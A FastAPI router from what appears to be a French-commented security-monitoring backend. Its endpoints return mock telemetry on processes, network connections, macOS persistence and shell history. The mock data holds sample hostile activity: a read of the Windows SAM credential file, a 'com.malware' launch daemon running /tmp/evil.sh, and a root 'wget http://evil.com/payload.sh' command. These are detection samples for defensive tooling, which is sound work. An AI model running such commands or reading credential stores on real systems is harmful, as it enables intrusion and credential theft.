from fastapi import APIRouter, HTTPException, Query
from typing import List, Optional, Dict, Any
from pydantic import BaseModel
from datetime import datetime
import logging

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/data", tags=["data"])

# Modèles Pydantic
class DataQuery(BaseModel):
    query: str
    limit: Optional[int] = 100
    offset: Optional[int] = 0

class DataResponse(BaseModel):
    results: List[Dict[str, Any]]
    total: int
    query: str
    execution_time_ms: float

class EventData(BaseModel):
    id: str
    type: str
    timestamp: datetime
    source: str
    data: Dict[str, Any]
    severity: Optional[str] = None
    tags: List[str] = []

# Endpoints
@router.post("/query", response_model=DataResponse)
async def execute_query(query: DataQuery):
    """Exécute une requête OQL sur les données."""
    try:
        # Simulation d'exécution de requête
        results = [
            {
                "id": "event_1",
                "type": "process_launch",
                "timestamp": datetime.now(),
                "source": "agent_001",
                "data": {
                    "process_name": "chrome.exe",
                    "pid": 1234,
                    "user": "john.doe"
                },
                "severity": "info",
                "tags": ["browser", "normal"]
            },
            {
                "id": "event_2",
                "type": "network_connection",
                "timestamp": datetime.now(),
                "source": "agent_001",
                "data": {
                    "remote_ip": "192.168.1.100",
                    "remote_port": 443,
                    "local_port": 54321
                },
                "severity": "medium",
                "tags": ["network", "https"]
            }
        ]
        
        # Simuler le temps d'exécution
        execution_time = 150.5
        
        return DataResponse(
            results=results[:query.limit],
            total=len(results),
            query=query.query,
            execution_time_ms=execution_time
        )
    
    except Exception as e:
        logger.error(f"Error executing query: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@router.get("/events", response_model=List[EventData])
async def get_events(
    event_type: Optional[str] = None,
    source: Optional[str] = None,
    severity: Optional[str] = None,
    limit: int = Query(100, le=1000),
    offset: int = Query(0, ge=0)
):
    """Récupère les événements avec filtres."""
    try:
        # Simulation d'événements
        events = [
            {
                "id": "event_1",
                "type": "process_launch",
                "timestamp": datetime.now(),
                "source": "agent_001",
                "data": {
                    "process_name": "chrome.exe",
                    "pid": 1234,
                    "user": "john.doe"
                },
                "severity": "info",
                "tags": ["browser", "normal"]
            },
            {
                "id": "event_2",
                "type": "network_connection",
                "timestamp": datetime.now(),
                "source": "agent_002",
                "data": {
                    "remote_ip": "192.168.1.100",
                    "remote_port": 443,
                    "local_port": 54321
                },
                "severity": "medium",
                "tags": ["network", "https"]
            },
            {
                "id": "event_3",
                "type": "file_access",
                "timestamp": datetime.now(),
                "source": "agent_001",
                "data": {
                    "file_path": "C:\\Windows\\System32\\config\\SAM",
                    "access_type": "read"
                },
                "severity": "high",
                "tags": ["sensitive_file", "suspicious"]
            }
        ]
        
        # Appliquer les filtres
        if event_type:
            events = [e for e in events if e["type"] == event_type]
        
        if source:
            events = [e for e in events if e["source"] == source]
        
        if severity:
            events = [e for e in events if e["severity"] == severity]
        
        # Appliquer la pagination
        return events[offset:offset + limit]
    
    except Exception as e:
        logger.error(f"Error getting events: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@router.get("/events/{event_id}", response_model=EventData)
async def get_event(event_id: str):
    """Récupère un événement spécifique."""
    try:
        # Simulation d'événement
        event = {
            "id": event_id,
            "type": "process_launch",
            "timestamp": datetime.now(),
            "source": "agent_001",
            "data": {
                "process_name": "chrome.exe",
                "pid": 1234,
                "user": "john.doe",
                "command_line": "chrome.exe --no-sandbox",
                "parent_pid": 1000
            },
            "severity": "info",
            "tags": ["browser", "normal"]
        }
        
        return event
    
    except Exception as e:
        logger.error(f"Error getting event {event_id}: {e}")
        raise HTTPException(status_code=404, detail="Event not found")

@router.get("/sources", response_model=List[str])
async def get_data_sources():
    """Récupère la liste des sources de données disponibles."""
    try:
        # Simulation de sources
        sources = [
            "agent_001",
            "agent_002", 
            "agent_003",
            "hive_node_1",
            "hive_node_2"
        ]
        
        return sources
    
    except Exception as e:
        logger.error(f"Error getting data sources: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@router.get("/types", response_model=List[str])
async def get_event_types():
    """Récupère la liste des types d'événements disponibles."""
    try:
        # Simulation de types d'événements
        event_types = [
            "process_launch",
            "process_terminate", 
            "network_connection",
            "network_disconnect",
            "file_access",
            "file_create",
            "file_delete",
            "registry_access",
            "registry_create",
            "registry_delete",
            "user_login",
            "user_logout",
            "shell_command",
            "dns_query"
        ]
        
        return event_types
    
    except Exception as e:
        logger.error(f"Error getting event types: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@router.get("/stats", response_model=Dict[str, Any])
async def get_data_stats():
    """Récupère les statistiques des données."""
    try:
        # Simulation de statistiques
        stats = {
            "total_events": 15420,
            "events_today": 1250,
            "active_agents": 45,
            "event_types": {
                "process_launch": 5230,
                "network_connection": 3120,
                "file_access": 2890,
                "registry_access": 2180,
                "user_login": 2000
            },
            "severity_distribution": {
                "info": 12000,
                "low": 2000,
                "medium": 1000,
                "high": 400,
                "critical": 20
            },
            "last_updated": datetime.now().isoformat()
        }
        
        return stats
    
    except Exception as e:
        logger.error(f"Error getting data stats: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@router.post("/export")
async def export_data(query: DataQuery, format: str = "json"):
    """Exporte les données selon une requête."""
    try:
        # Simulation d'export
        if format not in ["json", "csv", "xml"]:
            raise HTTPException(status_code=400, detail="Unsupported format")
        
        # Simuler des données d'export
        export_data = {
            "query": query.query,
            "format": format,
            "record_count": 150,
            "export_time": datetime.now().isoformat(),
            "download_url": f"/exports/export_{datetime.now().timestamp()}.{format}"
        }
        
        logger.info(f"Data export requested: {format} format")
        return export_data
    
    except Exception as e:
        logger.error(f"Error exporting data: {e}")
        raise HTTPException(status_code=500, detail="Internal server error")

@router.get("/macos_persistence")
async def get_macos_persistence(agent_id: str):
    """
    Récupère les données de persistance macOS pour un agent donné.
    """
    try:
        # Logique pour interroger la base de données (ClickHouse ou PostgreSQL)
        # db_results = db.query("SELECT * FROM macos_persistence WHERE agent_id = :agent_id", {"agent_id": agent_id})
        
        # Pour l'exemple, on retourne des données mock
        mock_data = [
            { 
                "path": "/Library/LaunchDaemons/com.malware.plist", 
                "program": "/tmp/evil.sh", 
                "type": "Global Daemon",
                "run_at_load": True,
                "label": "com.malware"
            },
            { 
                "path": "/Users/test/Library/LaunchAgents/com.google.keystone.agent.plist", 
                "program": "~/Library/Google/GoogleSoftwareUpdate/...", 
                "type": "User Agent",
                "run_at_load": True,
                "label": "com.google.keystone.agent"
            },
        ]
        return mock_data
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Erreur lors de la récupération des données: {str(e)}")

@router.get("/shell_history")
async def get_shell_history(agent_id: str):
    """
    Récupère l'historique des shells pour un agent donné.
    """
    try:
        # TODO: Implémenter la vraie logique de base de données
        mock_data = [
            {
                "timestamp": "2024-01-15T10:30:00Z",
                "username": "root",
                "command": "wget http://evil.com/payload.sh",
                "shell_type": "bash"
            }
        ]
        return mock_data
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Erreur lors de la récupération des données: {str(e)}")

@router.get("/network_connections")
async def get_network_connections(agent_id: str):
    """
    Récupère les connexions réseau pour un agent donné.
    """
    try:
        # TODO: Implémenter la vraie logique de base de données
        mock_data = [
            {
                "timestamp": "2024-01-15T10:31:00Z",
                "protocol": "tcp",
                "state": "ESTAB",
                "local_address": "192.168.1.100",
                "local_port": 54321,
                "peer_address": "1.2.3.4",
                "peer_port": 80,
                "process_name": "wget",
                "is_private_ip": False
            }
        ]
        return mock_data
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Erreur lors de la récupération des données: {str(e)}") 